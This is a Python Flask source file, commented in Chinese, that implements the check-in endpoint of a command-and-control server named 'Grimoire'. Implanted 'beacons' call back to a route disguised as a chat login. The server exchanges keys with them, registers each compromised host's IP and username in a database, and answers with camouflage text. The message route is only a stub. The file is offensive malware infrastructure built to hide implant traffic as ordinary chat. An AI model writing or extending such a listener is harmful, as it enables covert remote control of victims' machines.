# Beacon回连的地方

from flask import Blueprint, request, jsonify
from server.persistence.database import get_db_session
from shared.CryptoManager import GrimoireCryptoManager
from server.core.beacon_service import GrimoireBeaconService
from server.core.task_service import GrimoireTaskService
from cryptography.exceptions import InvalidTag
import json
import base64

# 实例化服务
crypto_mgr = GrimoireCryptoManager()
beacon_service = GrimoireBeaconService(crypto_mgr=crypto_mgr)
task_service = GrimoireTaskService()

# 创建蓝图，URL 前缀为 /api/chat
api_bp = Blueprint('chat_api', __name__, url_prefix='/api/chat')


def get_beacon_ip():
    # 从请求头或连接中获取客户端的 IP 地址，用于会话查找。
    # 代理功能目前不打算写，为了程序健壮还是处理一下，优先使用 X-Forwarded-For
    return request.headers.get('X-Forwarded-For', request.remote_addr)


# 握手，这里握手的固定格式为:
"""
{
    "hello":公钥,
    "user":beacon读出来的用户名,
    "password":随便
}

{
    "welcome":公钥,
    "user":beacon读出来的用户名,
    "info":"welcome for chat"
}
"""
@api_bp.route('/login', methods=['POST'])
def initial_handshake():
    """
    Beacon 首次签入，进行密钥协商和会话注册。
    预期接收：{"hello": <公钥B64>, "user": "...", "password": "..."}
    """
    beacon_ip = get_beacon_ip()
    try:
        data = request.get_json()

        # 密钥派生和 ID 生成
        beacon_public_key_b64 = data.get('hello')
        if not beacon_public_key_b64:
            return jsonify({'error': 'Missing public key'}), 401

        beacon_public_key = base64.b64decode(beacon_public_key_b64)

        # GrimoireCryptoManager 内部生成 beacon_id = SHA256(AES_Key) 并存储 AESGCM 实例
        beacon_id = crypto_mgr.derive_session_key(
            my_private=crypto_mgr.private, beacon_public_key=beacon_public_key
        )

        # 注册 Beacon 会话到数据库
        with get_db_session() as db:
            # 这里我们简化，只用 IP 和 ID 注册
            beacon_service.register_new_beacon(
                db=db,
                beacon_id=beacon_id,
                ip_address=beacon_ip,
                # 假设初始数据也在这里注册
                initial_data={'username': data.get('user', 'Guest'), 'hostname': 'N/A'} # 简化指纹
            )

        server_public_key_b64 = base64.b64encode(crypto_mgr.get_publickey()).decode('utf-8')
        # 返回确认信息（无需返回 ID，因为它不通过网络传输）
        return jsonify({
            'welcome': server_public_key_b64,
            'user': data.get('user', 'Guest'),
            'info': 'welcome for chat'
        }), 200

    except Exception as e:
        print(f"Handshake failed for {beacon_ip}: {e}")
        return jsonify({'error': 'Internal server error'}), 503



@api_bp.route('/send', methods=['POST'])
def secure_communication():
    return "Tomorrow"